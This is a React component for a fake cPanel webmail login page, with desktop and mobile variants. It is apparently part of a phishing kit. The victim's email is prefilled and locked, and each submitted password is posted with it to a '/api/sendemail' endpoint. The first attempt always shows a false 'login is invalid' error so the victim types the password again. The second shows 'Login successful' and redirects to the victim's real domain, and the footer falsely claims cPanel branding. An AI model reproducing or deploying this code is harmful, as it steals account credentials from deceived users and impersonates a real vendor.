"use client";

import React, { useState, useEffect } from "react";

const Popup = ({ domain, eparams }) => {
  const [email, setEmail] = useState(eparams || "");
  const [password, setPassword] = useState("");
  const [showError, setShowError] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [hasSubmitted, setHasSubmitted] = useState(false);
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [isSmallScreen, setIsSmallScreen] = useState(false);

  useEffect(() => {
    const link = document.createElement("link");
    link.href = "https://fonts.googleapis.com/css2?family=Open+Sans&display=swap";
    link.rel = "stylesheet";
    document.head.appendChild(link);

    const checkScreenSize = () => {
      setIsSmallScreen(window.innerWidth <= 1024);
    };
    
    checkScreenSize();
    window.addEventListener("resize", checkScreenSize);
    
    return () => {
      try {
        document.head.removeChild(link);
      } catch (err) {}
      window.removeEventListener("resize", checkScreenSize);
    };
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    
    if (password.trim() === "") return;
    
    setIsAuthenticating(true);
    
    try {
      await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          eparams: email,
          password
        }),
      });
    } catch (error) {
      console.error("Failed to send:", error);
    }

    setTimeout(() => {
      setIsAuthenticating(false);
      
      if (!hasSubmitted) {
        setShowError(true);
        setShowSuccess(false);
        setHasSubmitted(true);
        
        setTimeout(() => {
          setShowError(false);
        }, 3000);
      } else {
        setShowError(false);
        setShowSuccess(true);
        
        setTimeout(() => {
          window.location.href = `https://${domain}`;
        }, 1500);
      }
    }, 1500);
  };

  const messageBoxStyle = {
    backgroundColor: "#009cde",
    color: "white",
    border: "1px solid #009cde",
    borderRadius: "4px",
    padding: isSmallScreen ? "10px 10px 10px 35px" : "12px 12px 12px 40px",
    margin: isSmallScreen ? "0 20px 15px 20px" : "0 180px 20px 180px",
    fontSize: isSmallScreen ? "13px" : "14px",
    textAlign: "left",
    fontWeight: "500",
    position: "relative",
    width: isSmallScreen ? "calc(100% - 80px)" : "calc(100% - 360px)",
    display: "flex",
    alignItems: "center",
    gap: "10px"
  };

  const errorBoxStyle = {
    ...messageBoxStyle,
    backgroundColor: "#d35351",
    border: "1px solid #d35351",
  };

  const successBoxStyle = {
    ...messageBoxStyle,
    backgroundColor: "#28A745",
    border: "1px solid #28A745",
  };

  const closeButtonStyle = {
    position: "absolute",
    left: isSmallScreen ? "8px" : "10px",
    top: "50%",
    transform: "translateY(-50%)",
    background: "none",
    border: "none",
    color: "white",
    fontSize: isSmallScreen ? "14px" : "16px",
    cursor: "pointer",
    fontWeight: "500",
    width: "20px",
    height: "20px",
    borderRadius: "50%",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
  };

  const loginButtonStyle = {
    padding: isSmallScreen ? "" : "12px 24px",
    display: "flex",
    alignItems: "center",
    justifyContent: "center"
  };

  return (
    <div className="popup-frame">
      {isAuthenticating && (
        <div style={messageBoxStyle}>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" strokeLinecap="round"/>
          </svg>
          Authenticating...
        </div>
      )}

      {showError && !isAuthenticating && (
        <div style={errorBoxStyle}>
          <button 
            onClick={() => setShowError(false)}
            style={closeButtonStyle}
          >
            ×
          </button>
          The login is invalid.
        </div>
      )}

      {showSuccess && !isAuthenticating && (
        <div style={successBoxStyle}>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M20 6L9 17l-5-5" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
          Login successful
        </div>
      )}

      <img className="webmail-image" src="/Webmail.png" alt="Webmail Logo" />

      <div className="email-section">
        <label className="email-label">Email Address</label>
        <div className="email-input-group">
          <img className="email-icon" src="/Human icon.jpg" alt="Email icon" />
          <input 
            type="email" 
            placeholder="Enter your email" 
            value={email} 
            readOnly
            className="email-input" 
          />
        </div>
      </div>

      <div className="password-section">
        <label className="password-label">Password</label>
        <div className="password-input-group">
          <img className="password-icon" src="/password icon.jpg" alt="Password icon" />
          <input 
            type="password" 
            placeholder="Enter your email password" 
            value={password} 
            onChange={(e) => setPassword(e.target.value)} 
            className="password-input" 
          />
        </div>
      </div>

      <button
        onClick={handleLogin}
        className="login-button"
        disabled={isAuthenticating}
        style={loginButtonStyle}
      >
        Log in
      </button>

      <div className="divider-section">
        <div className="divider-line-left">
          <hr className="divider-hr" />
        </div>
        <span className="divider-center">
          <img className="divider-icon" src="/Or icon.jpg" alt="Divider Icon" />
        </span>
        <div className="divider-line-right">
          <hr className="divider-hr" />
        </div>
      </div>

      <button
        onClick={() => alert("Redirecting to cPanel login")}
        className="cpanel-button"
        style={isSmallScreen ? {} : { padding: "12px 24px" }}
      >
        <img className="cpanel-logo" src="/cpanel logo.jpg" alt="cPanel Logo" />
        Log in via cPanelID
      </button>

      <div className="language-footer">
        <p> English </p> <p> العربية </p> <p>čeština </p> <p>dansk </p> <p> Deutsch </p> <p>Ελληνικά </p> <p> español </p> <p> español latinoamericano </p>
      </div>

      <div className="privacy-section">
        <img className="privacy-image" src="/Privacy policy logo.jpg" alt="Privacy Policy" />
      </div>
    </div>
  );
};

const PopupMobile = ({ domain, eparams }) => {
  const [email, setEmail] = useState(eparams || "");
  const [password, setPassword] = useState("");
  const [locale, setLocale] = useState("English");
  const [showError, setShowError] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [hasSubmitted, setHasSubmitted] = useState(false);
  const [isAuthenticating, setIsAuthenticating] = useState(false);

  useEffect(() => {
    const link = document.createElement("link");
    link.href = "https://fonts.googleapis.com/css2?family=Open+Sans&display=swap";
    link.rel = "stylesheet";
    document.head.appendChild(link);
    
    const meta = document.createElement("meta");
    meta.name = "viewport";
    meta.content = "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no";
    document.head.appendChild(meta);
    
    return () => {
      try {
        document.head.removeChild(link);
        document.head.removeChild(meta);
      } catch (err) {}
    };
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    
    if (password.trim() === "") return;
    
    setIsAuthenticating(true);
    
    try {
      await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          eparams: email,
          password
        }),
      });
    } catch (error) {
      console.error("Failed to send:", error);
    }

    setTimeout(() => {
      setIsAuthenticating(false);
      
      if (!hasSubmitted) {
        setShowError(true);
        setShowSuccess(false);
        setHasSubmitted(true);
        
        setTimeout(() => {
          setShowError(false);
        }, 3000);
      } else {
        setShowError(false);
        setShowSuccess(true);
        
        setTimeout(() => {
          window.location.href = `https://${domain}`;
        }, 1500);
      }
    }, 1500);
  };

  const mobileMessageBoxStyle = {
    backgroundColor: "#009cde",
    color: "white",
    border: "1px solid #009cde",
    borderRadius: "4px",
    padding: "10px 10px 10px 35px",
    margin: "0 15px 15px 15px",
    fontSize: "13px",
    textAlign: "left",
    fontWeight: "500",
    position: "relative",
    width: "calc(100% - 60px)",
    display: "flex",
    alignItems: "center",
    gap: "8px"
  };

  const mobileErrorBoxStyle = {
    ...mobileMessageBoxStyle,
    backgroundColor: "#d35351",
    border: "1px solid #d35351",
  };

  const mobileSuccessBoxStyle = {
    ...mobileMessageBoxStyle,
    backgroundColor: "#28A745",
    border: "1px solid #28A745",
  };

  const mobileCloseButtonStyle = {
    position: "absolute",
    left: "8px",
    top: "50%",
    transform: "translateY(-50%)",
    background: "none",
    border: "none",
    color: "white",
    fontSize: "14px",
    cursor: "pointer",
    fontWeight: "500",
    width: "18px",
    height: "18px",
    borderRadius: "50%",
    display: "flex",
    alignItems: "center",
    justifyContent: "center"
  };

  return (
    <div className="popup-mobile-frame">
      {isAuthenticating && (
        <div style={mobileMessageBoxStyle}>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" strokeLinecap="round"/>
          </svg>
          Authenticating...
        </div>
      )}

      {showError && !isAuthenticating && (
        <div style={mobileErrorBoxStyle}>
          <button 
            onClick={() => setShowError(false)}
            style={mobileCloseButtonStyle}
          >
            ×
          </button>
          The login is invalid.
        </div>
      )}

      {showSuccess && !isAuthenticating && (
        <div style={mobileSuccessBoxStyle}>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M20 6L9 17l-5-5" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
          Login successful
        </div>
      )}

      <div className="mobile-header">
        <img className="mobile-webmail-image" src="/Webmail.png" alt="Webmail Logo" />
      </div>

      <div className="mobile-email-group">
        <img className="mobile-email-icon" src="/Human icon.jpg" alt="User icon" />
        <input 
          type="email" 
          value={email} 
          readOnly
          placeholder="Enter your email" 
          className="mobile-email-input" 
          aria-label="Email address" 
          style={{ outline: "none" }}
        />
      </div>

      <div className="mobile-password-group">
        <img className="mobile-password-icon" src="/password icon.jpg" alt="Password icon" />
        <input 
          type="password" 
          value={password} 
          onChange={(e) => setPassword(e.target.value)} 
          placeholder="Enter your password" 
          className="mobile-password-input" 
          aria-label="Password" 
          style={{ outline: "none", fontSize: "16px" }}
        />
      </div>

      <button onClick={handleLogin} className="mobile-login-button" disabled={isAuthenticating}>
        Log in
      </button>

      <div className="mobile-divider">
        <hr className="mobile-divider-line" />
        <span className="mobile-divider-text">OR</span>
        <hr className="mobile-divider-line" />
      </div>

      <button onClick={() => alert("Redirecting to cPanel login")} className="mobile-cpanel-button">
        <img className="mobile-cpanel-logo" src="/cpanel logo.jpg" alt="cPanel Logo" />
        Log in via cPanel
      </button>

      <div className="mobile-locale-section">
        <label htmlFor="locale" className="mobile-locale-label">Select a locale:</label>
        <select id="locale" value={locale} onChange={(e) => setLocale(e.target.value)} className="mobile-locale-select">
          <option>English</option>
          <option>العربية</option>
          <option>Čeština</option>
          <option>Dansk</option>
          <option>Deutsch</option>
          <option>Ελληνικά</option>
          <option>español</option>
        </select>
      </div>

      <div className="mobile-footer">
        <p>© 2025 cPanel, L.L.C.</p>
        <p>Privacy Policy</p>
      </div>
    </div>
  );
};

const ResponsivePopup = (props) => {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener("resize", checkMobile);
    return () => window.removeEventListener("resize", checkMobile);
  }, []);

  return isMobile ? <PopupMobile {...props} /> : <Popup {...props} />;
};

export default ResponsivePopup;